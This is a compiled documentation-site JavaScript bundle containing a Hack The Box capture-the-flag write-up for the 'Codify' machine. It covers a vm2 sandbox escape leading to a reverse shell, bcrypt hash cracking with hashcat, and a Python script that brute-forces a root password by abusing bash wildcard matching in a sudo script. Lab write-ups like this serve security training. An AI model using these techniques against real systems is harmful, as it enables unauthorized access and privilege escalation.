"use strict";(self.webpackChunkdocs=self.webpackChunkdocs||[]).push([[3771],{3006:(e,n,s)=>{s.r(n),s.d(n,{assets:()=>c,contentTitle:()=>i,default:()=>l,frontMatter:()=>a,metadata:()=>t,toc:()=>h});const t=JSON.parse('{"id":"Hacking/Write-ups/Hack the box/Machines/Linux/easy/Codify","title":"Codify","description":"Enumeration","source":"@site/docs/Hacking/Write-ups/Hack the box/Machines/Linux/easy/Codify.md","sourceDirName":"Hacking/Write-ups/Hack the box/Machines/Linux/easy","slug":"/write-up/htb/machines/easy/codify","permalink":"/docs/write-up/htb/machines/easy/codify","draft":false,"unlisted":false,"tags":[],"version":"current","frontMatter":{"slug":"/write-up/htb/machines/easy/codify","pagination_next":null,"pagination_prev":null},"sidebar":"tutorialSidebar"}');var o=s(4848),r=s(8453);const a={slug:"/write-up/htb/machines/easy/codify",pagination_next:null,pagination_prev:null},i=void 0,c={},h=[{value:"Enumeration",id:"enumeration",level:2},{value:"Foothold",id:"foothold",level:2},{value:"Privilege escalation",id:"privilege-escalation",level:2}];function d(e){const n={a:"a",code:"code",h2:"h2",p:"p",pre:"pre",...(0,r.R)(),...e.components};return(0,o.jsxs)(o.Fragment,{children:[(0,o.jsx)(n.h2,{id:"enumeration",children:"Enumeration"}),"\n",(0,o.jsx)(n.pre,{children:(0,o.jsx)(n.code,{className:"language-bash",children:'curl 10.10.11.239                                                  \n<!DOCTYPE HTML PUBLIC "-//IETF//DTD HTML 2.0//EN">\n<html><head>\n<title>301 Moved Permanently</title>\n</head><body>\n<h1>Moved Permanently</h1>\n<p>The document has moved <a href="http://codify.htb/">here</a>.</p>\n<hr>\n<address>Apache/2.4.52 (Ubuntu) Server at 10.10.11.239 Port 80</address>\n</body></html>\n'})}),"\n",(0,o.jsx)(n.p,{children:"Let's add the host to /etc/hosts"}),"\n",(0,o.jsx)(n.p,{children:"nmap reports several things opened:"}),"\n",(0,o.jsx)(n.pre,{children:(0,o.jsx)(n.code,{className:"language-bash",children:"PORT     STATE SERVICE\n22/tcp   open  ssh\n80/tcp   open  http\n3000/tcp open  ppp\n\nPORT   STATE SERVICE VERSION\n22/tcp open  ssh     OpenSSH 8.9p1 Ubuntu 3ubuntu0.4 (Ubuntu Linux; protocol 2.0)\n80/tcp open  http    Apache httpd 2.4.52\n3000/tcp open  http    Node.js Express framework\n|_http-title: Codify\n"})}),"\n",(0,o.jsx)(n.p,{children:"The port 80 is a webserver that hosts a NodeJS editor to execute NodeJS in a sandboxed scenario."}),"\n",(0,o.jsx)(n.p,{children:"Port 3000 looks the same."}),"\n",(0,o.jsx)(n.p,{children:"The sandbox looks like it's using the vm2 library:"}),"\n",(0,o.jsx)(n.pre,{children:(0,o.jsx)(n.code,{children:" The vm2 library is a widely used and trusted tool for sandboxing JavaScript. It adds an extra layer of security to prevent potentially harmful code from causing harm to your system. We take the security and reliability of our platform seriously, and we use vm2 to ensure a safe testing environment for your code.\n"})}),"\n",(0,o.jsxs)(n.p,{children:["The sandbox has the following limitations: ",(0,o.jsx)(n.a,{href:"http://codify.htb/limitations",children:"http://codify.htb/limitations"})]}),"\n",(0,o.jsx)(n.p,{children:"The editor works by sending a POST request with base64 content:"}),"\n",(0,o.jsx)(n.pre,{children:(0,o.jsx)(n.code,{children:"curl 'http://codify.htb/run' -X POST -H 'Referer: http://codify.htb/editor' -H 'Content-Type: application/json' -H 'Origin: http://codify.htb' --data-raw '{\"code\":\"YQ==\"}'\n"})}),"\n",(0,o.jsxs)(n.p,{children:["This request belongs to the code ",(0,o.jsx)(n.code,{children:"a"}),":"]}),"\n",(0,o.jsx)(n.pre,{children:(0,o.jsx)(n.code,{className:"language-bash",children:"\u2514\u2500$ echo YQ== | base64 -d\na\n"})}),"\n",(0,o.jsx)(n.h2,{id:"foothold",children:"Foothold"}),"\n",(0,o.jsxs)(n.p,{children:["Look at Google for vm2 escape, found this payload: ",(0,o.jsx)(n.a,{href:"https://security.snyk.io/vuln/SNYK-JS-VM2-5537100",children:"https://security.snyk.io/vuln/SNYK-JS-VM2-5537100"})]}),"\n",(0,o.jsxs)(n.p,{children:["Prepared the script a bit and got it, then send a reverse shell and we're in as ",(0,o.jsx)(n.code,{children:"svc"})," user and then improve to a good shell."]}),"\n",(0,o.jsxs)(n.p,{children:["Found the user ",(0,o.jsx)(n.code,{children:"joshua"})," on /etc/passwd."]}),"\n",(0,o.jsxs)(n.p,{children:["Checking the contents of the server, there's the ",(0,o.jsx)(n.code,{children:"contact"})," folder which looks like an old nodejs app. It has a sqlite database which contains a users table with an entry for joshua. Let's try to crack the bcrypt hash stored there."]}),"\n",(0,o.jsx)(n.pre,{children:(0,o.jsx)(n.code,{className:"language-bash",children:"hashcat exfil/hash -m 3200 -a 0 /usr/share/wordlists/rockyou.txt\n"})}),"\n",(0,o.jsxs)(n.p,{children:["Found the password for user ",(0,o.jsx)(n.code,{children:"joshua"}),", now connect with SSH, and we're in and get can get the user flag."]}),"\n",(0,o.jsx)(n.h2,{id:"privilege-escalation",children:"Privilege escalation"}),"\n",(0,o.jsxs)(n.p,{children:["The user ",(0,o.jsx)(n.code,{children:"joshua"})," can execute this command as root:"]}),"\n",(0,o.jsx)(n.pre,{children:(0,o.jsx)(n.code,{className:"language-bash",children:"joshua@codify:~$ sudo -l\n[sudo] password for joshua: \nMatching Defaults entries for joshua on codify:\n    env_reset, mail_badpass, secure_path=/usr/local/sbin\\:/usr/local/bin\\:/usr/sbin\\:/usr/bin\\:/sbin\\:/bin\\:/snap/bin, use_pty\n\nUser joshua may run the following commands on codify:\n    (root) /opt/scripts/mysql-backup.sh\n"})}),"\n",(0,o.jsxs)(n.p,{children:["In that script, there's one ",(0,o.jsx)(n.code,{children:"if"})," statement that checks the user input password with the credentials stored in one file:"]}),"\n",(0,o.jsx)(n.pre,{children:(0,o.jsx)(n.code,{className:"language-bash",children:"if [[ $DB_PASS == $USER_PASS ]]; then\n"})}),"\n",(0,o.jsxs)(n.p,{children:["The problem with that is, this if does not perform string comparison, it performs pattern matching. Which means that it ",(0,o.jsx)(n.code,{children:"USER_PASS"})," is ",(0,o.jsx)(n.code,{children:"*"}),", the if will pass."]}),"\n",(0,o.jsxs)(n.p,{children:["The pattern matching will work with any character, for instance let's say the password is ",(0,o.jsx)(n.code,{children:"password"}),", if the user provides the password ",(0,o.jsx)(n.code,{children:"p*"})," it will pass, so we can slowly bruce-force each character thanks to pattern matching with the following script:"]}),"\n",(0,o.jsx)(n.pre,{children:(0,o.jsx)(n.code,{className:"language-python",children:'import string\nimport subprocess\nimport time\n\nall_characters = list(string.ascii_letters + string.digits)\npassword = ""\nwhile True:\n    for char in all_characters:\n        command = f"echo \'{password}{char}*\' | sudo /opt/scripts/mysql-backup.sh"\n        output = subprocess.run(command, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, text=True).stdout\n\n        if "Password confirmed" in output:\n            password += char\n            print(password)\n            time.sleep(1)\n'})}),"\n",(0,o.jsxs)(n.p,{children:["And found the password for root, now we can run ",(0,o.jsx)(n.code,{children:"su"})," and provide that password and we got root access."]})]})}function l(e={}){const{wrapper:n}={...(0,r.R)(),...e.components};return n?(0,o.jsx)(n,{...e,children:(0,o.jsx)(d,{...e})}):d(e)}},8453:(e,n,s)=>{s.d(n,{R:()=>a,x:()=>i});var t=s(6540);const o={},r=t.createContext(o);function a(e){const n=t.useContext(r);return t.useMemo(function(){return"function"==typeof e?e(n):{...n,...e}},[n,e])}function i(e){let n;return n=e.disableParentContext?"function"==typeof e.components?e.components(o):e.components||o:a(e.components),t.createElement(r.Provider,{value:n},e.children)}}}]);